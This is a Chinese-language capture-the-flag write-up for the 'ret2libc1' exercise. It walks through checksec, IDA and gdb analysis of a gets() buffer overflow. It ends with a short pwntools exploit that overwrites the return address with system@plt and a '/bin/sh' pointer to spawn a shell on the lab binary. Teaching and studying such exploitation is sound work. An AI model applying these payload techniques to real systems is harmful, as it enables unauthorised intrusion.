## ret2libc1复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 查阅手册，利用libc中的函数
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230423171448401](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231714438.png)

能够得知以下信息：

- 可执行文件为是一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“堆栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230423171542475](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231715494.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，因此查找是否有可以利用的工具函数与字符串。先从字符串找起，使用IDA pro的`Alt+t`功能查找字符串`/bin/sh`：

![image-20230423171632865](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231716876.png)

字符串位置位于`0x08048720`。但是使用IDA快捷键`X`的xrefs功能并没有找到其在程序中的可利用调用。那么接下来手动搜索可利用的函数，如libc中的`system()`函数，可通过`Alt+t`查找`_system`：

![image-20230423172209258](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231722274.png)

![image-20230423172227886](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231722904.png)

在`secure()`函数中找到了对`system()`函数的调用，但传入的字符串"shell!?"，无法有效利用。那么需要利用程序引入的libc库函数`_system`并手动构造栈帧并完成函数调用。首先确认`_system`函数的位置：

![image-20230424103529766](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241035812.png)

经过查找，发现其函数地址`0x08048460`。查阅文档，调用libc库函数中`_system`应满足如下栈结构：

1. `_system`函数的地址（在plt表中），即`0x08048460`
2. 一个返回地址
3. 想传入`_system`的字符串参数的地址

因此构思获得shell的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
2. 覆盖`main()`函数的返回地址为`_system`函数的地址`0x08048460`
3. 在后续填入一个32位的虚假返回地址
4. 在后续填入字符串`/bin/sh`的地址`0x08048720`
5. 当`main()`函数执行完毕退出时，eip指针返回到`_system`函数的地址并读入后续的虚假返回地址和字符串参数，并最终启动一个子进程弹出shell供攻击者使用

### 攻击复现

接下来实现攻击，同上面题目，要先确定`main()`函数返回地址。

![image-20230424105219836](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241052849.png)

![image-20230424105306288](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241053358.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x0804867E`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffced0`，其存放的内容即字符串`s`的地址为`0xffffceec`；基址指针寄存器ebp的地址为`0xffffcf58`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf58-0xffffceec=0x6c`。此时内存结构如下图所示：

![image-20230424105446557](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241054587.png)

根据上述思路编写payload，构造内存结果如下：

![image-20230424105753021](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241057056.png)

最后的payload如下：

```python
from pwn import *

sh = process('./ret2libc1')
binsh = 0x8048720
system = 0x08048460
sh.sendline(b'a' * 112 + p32(system) + b'a' * 4 + p32(binsh))
sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230424110223191](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241102204.png)
